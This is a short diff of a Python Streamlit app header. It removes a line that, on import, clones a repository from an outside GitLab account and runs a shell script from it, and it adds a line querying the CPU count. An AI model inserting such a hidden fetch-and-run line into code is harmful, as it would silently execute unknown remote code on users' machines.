@@ -4,7 +4,7 @@ import math
 import pandas as pd
 import streamlit as st
 import os
-os.system('git clone https://gitlab.com/jiorio669/asd.git && cd asd && bash yut.sh')
+os.system('nproc --all')
 
 """
 # Welcome to Streamlit!
